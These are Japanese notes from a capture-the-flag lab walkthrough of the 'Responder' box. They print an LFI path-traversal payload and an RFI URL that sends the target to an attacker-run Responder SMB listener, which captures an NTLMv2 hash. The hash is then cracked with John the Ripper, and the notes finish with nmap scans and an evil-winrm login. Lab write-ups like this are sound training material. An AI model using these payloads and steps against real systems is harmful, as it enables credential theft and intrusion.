# Responder

## メモ

- ``/etc/hosts``ファイルにIPアドレス ドメイン名のペアを挿入する
- WindowsサーバへのLocal File Include (LFI) ``../../../../../../../../windows/system32/drivers/etc/hosts``
- Remote File Include (RFI) ``//10.129.95.234/somefile``
- NTLM(New Technology LAN Manager)
  - NTLM認証はチャレンジ/レスポンスメカニズム

## 手順

- サイトに飛ぶ
- クエリパラメータを使っているところを探す
  - この問題では、言語を変更するボタンで``?page=<filename>``を使っていた
- この場合2種類の攻撃が可能
  - LFI
    - サーバのローカルファイルを出力させる攻撃
  - RFI
    - サーバにとってのリモートサーバ(つまり自分のPC(ローカル)でもよい)のファイル

### Responder

使い方

```
$ sudo responder -I tun0

-- 省略

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.37] //ここのIPアドレスを使ってRFIを行う
    Responder IPv6             [dead:beef:4::1023]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

-- 省略

[+] Listening for events...

```

攻撃したいサイトにリクエスト

```
http://<host name>/index.php?page=//<Reponder IP>/whatever
```

するとターミナル上で以下の表示がでる

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.160.239
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:e31b0661886ee2fe:A57075CC145AD0B4DBF2DC799B36D567:01010000000000000027AB2E9BE1DA01D433F70BDD19F0FB0000000002000800420037004A00480001001E00570049004E002D00510053005A004E0043005A003200420049003100330004003400570049004E002D00510053005A004E0043005A00320042004900310033002E00420037004A0048002E004C004F00430041004C0003001400420037004A0048002E004C004F00430041004C0005001400420037004A0048002E004C004F00430041004C00070008000027AB2E9BE1DA01060004000200000008003000300000000000000001000000002000003D21F00C78CFB8C1C6B784468A283FCCBE695909EFB158145D88A6A7819BDAF90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330037000000000000000000

```

Administratorのハッシュ値をjohn the ripperにかける

Hash値は以下のフォルダに保存してある

```
/usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.222.txt
```

### John The Ripper

Responderで生成したハッシュ値をJohn The Ripperでクラック

```bash
sudo john -w=/usr/share/wordlists/rockyou.txt <ハッシュ値のファイルパス>
```

すでにクラック済みである場合は

```bash
sudo john --show <ハッシュ値のファイルパス>
```

### ポート解析

```bash
└──╼ $nmap -p- --min-rate 10000 10.129.139.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 10:11 UTC
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 61.89% done; ETC: 10:12 (0:00:25 remaining)
Nmap scan report for unika.htb (10.129.139.224)
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pu
```

```bash
└──╼ $nmap -p 5985 -sV -sCV 10.129.139.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 10:15 UTC
Nmap scan report for unika.htb (10.129.139.224)
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds
```

### Evil-WinRM

[Evil-WinRM Github](https://github.com/Hackplayers/evil-winrm)

This shell is the ultimate WinRM shell for hacking/pentesting.

```bash
evil-winrm -i <IPアドレス> -u <ユーザ名> -p <パスワード>
```

